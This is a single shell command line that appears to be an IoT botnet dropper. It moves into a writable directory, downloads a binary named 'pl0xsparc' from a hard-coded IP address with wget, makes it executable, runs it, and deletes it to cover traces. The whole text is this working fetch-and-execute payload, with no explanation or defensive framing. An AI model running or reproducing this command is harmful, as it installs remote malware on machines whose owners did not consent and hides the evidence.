cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xsparc; chmod +x pl0xsparc; ./pl0xsparc; rm -rf pl0xsparc
